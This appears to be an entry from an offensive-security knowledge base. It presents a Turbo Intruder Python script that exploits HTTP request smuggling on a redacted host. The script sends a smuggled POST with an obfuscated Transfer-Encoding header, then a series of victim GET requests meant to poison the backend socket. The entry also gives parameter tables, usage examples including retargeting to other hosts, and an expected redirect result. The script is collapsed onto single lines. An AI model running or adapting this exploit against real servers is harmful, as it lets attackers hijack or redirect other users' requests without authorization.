---
data: >-
  def queueRequests(target, wordlists): engine =
  RequestEngine(endpoint='https://██████████:443', concurrentConnections=5,
  requestsPerConnection=1, pipeline=False, maxRetriesPerRequest=0 )
  engine.start() attack = '''POST /████ HTTP/1.1 Fooz: bar\nTransfer-Encoding:
  chunked Host: stage.█████ Accept-Encoding: gzip, deflate Accept: */*
  Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT
  6.1; Win64; x64; Trident/5.0) Connection: keep-alive Content-Type:
  application/x-www-form-urlencoded Content-Length: 77 Foo: bar 220 24GET███████
  HTTP/1.1 X: X''' engine.queue(attack) victim = '''GET /foo.jpg?x=%s HTTP/1.1
  Host: stage.████████ Accept-Encoding: gzip, deflate Accept: */*
  Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT
  6.1; Win64; x64; Trident/5.0) Connection: keep-alive ''' for i in range(15):
  engine.queue(victim, i) time.sleep(0.2) def handleResponse(req, interesting):
  table.add(req)
tags:
  - http-request-smuggling
  - script
type: command
executor: python
platforms:
  - Web
id: b69a81b4-b8be-450a-94b8-b15008c32d5c
created_at: '2025-12-13T09:01:21.981Z'
updated_at: '2025-12-13T09:01:21.981Z'
verified: false
validated: true
submitted: true
---
# Turbo Intruder HTTP Smuggling Script

## Command

```python
def queueRequests(target, wordlists): engine = RequestEngine(endpoint='https://██████████:443', concurrentConnections=5, requestsPerConnection=1, pipeline=False, maxRetriesPerRequest=0 ) engine.start() attack = '''POST /████ HTTP/1.1 Fooz: bar\nTransfer-Encoding: chunked Host: stage.█████ Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 77 Foo: bar 220 24GET███████ HTTP/1.1 X: X''' engine.queue(attack) victim = '''GET /foo.jpg?x=%s HTTP/1.1 Host: stage.████████ Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: keep-alive ''' for i in range(15): engine.queue(victim, i) time.sleep(0.2) def handleResponse(req, interesting): table.add(req)
```

## Description

Defines a Turbo Intruder script to queue attack and victim requests to exploit HTTP Request Smuggling by poisoning the backend socket.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `endpoint` | Specifies the target URL https://██████████:443 | Yes |
| `concurrentConnections` | Sets number of concurrent connections to 5 | Yes |
| `requestsPerConnection` | Limits to 1 request per connection | Yes |
| `pipeline` | Disables pipelining | Yes |
| `maxRetriesPerRequest` | Sets retries to 0 | Yes |
| `attack` | The smuggled request payload | Yes |
| `victim` | The simulated victim request payload | Yes |

## Examples

### Basic Usage

```python
# Run in Turbo Intruder
queueRequests(target, wordlists)
```

### Advanced Usage

```python
# Modify endpoint and queue more victims
engine = RequestEngine(endpoint='https://other.target:443', ...)
```

## Expected Output

One of the victim responses is a 302 redirect to █████████.

## Related

- [[procedures/Exploit-HTTP-Request-Smuggling-with-Turbo-Intruder]]
- [[tools/Turbo-Intruder]]
